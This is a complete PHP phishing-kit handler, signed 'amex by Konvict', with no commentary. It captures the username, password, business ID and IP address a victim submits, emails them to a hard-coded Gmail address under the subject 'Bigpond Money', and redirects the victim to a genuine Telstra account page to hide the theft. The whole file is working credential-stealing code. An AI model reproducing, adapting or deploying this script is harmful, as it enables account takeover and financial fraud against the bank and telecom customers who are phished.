<?php
$ip = getenv("REMOTE_ADDR");
$message .= "---------------+ amex by Konvict +-----------------\n";
$message .= "Username : ".$_POST['username']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "biz ID : ".$_POST['businessid']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------+ Konvict +-----------------\n";
$send = "centromarinasa@gmail.com";
$subject = "Bigpond Money";
mail("$send", "$subject", $message); 
header("Location: https://www.my.telstra.com.au/myaccount/home");
?>
